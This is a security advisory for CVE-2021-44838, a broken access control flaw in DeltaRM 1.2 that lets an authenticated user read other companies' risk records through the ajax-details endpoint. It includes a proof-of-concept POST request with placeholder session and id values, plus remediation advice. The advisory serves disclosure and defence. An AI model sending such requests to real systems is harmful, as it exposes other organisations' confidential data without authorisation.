# CVE-2021-44838

=======================================================================

* Broken Access Controls in Risk Details between companies
* Affected Product: DeltaRM 1.2
* Vendor: DeltaRM
* Severity: High
* Vulnerability Class: Broken Access Controls
* Status: Fixed
* Author(s): Renato Cruz
  =======================================================================

## Summary

An issue was discovered in Delta RM 1.2. > Using the /risque/risque/ajax-details endpoint, with a POST request indicating the risk to access with the id parameter, it is possible for users to access risks of other companies.

## Reproduction Steps

As an authenticated user, send the following request

```
POST /risque/risque/ajax-details HTTP/1.1
Host: deltarm.com
Cookie: PHPSESSID=*session cookie*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

id=*another company id*&evalId=&appel=

```
## Remediation

The application needs to validate the current user roles and permissions, and guarantee that the user only has access to the expected allowed features and context.

* With the exception of public resources, deny by default.
* Log access control failures, alert admins when appropriate (e.g. repeated failures).
* Rate limit API and controller access to minimize the harm from automated attack tooling.
* JWT tokens should be invalidated on the server after logout.
* Developers and QA staff should include functional access control unit and integration tests.
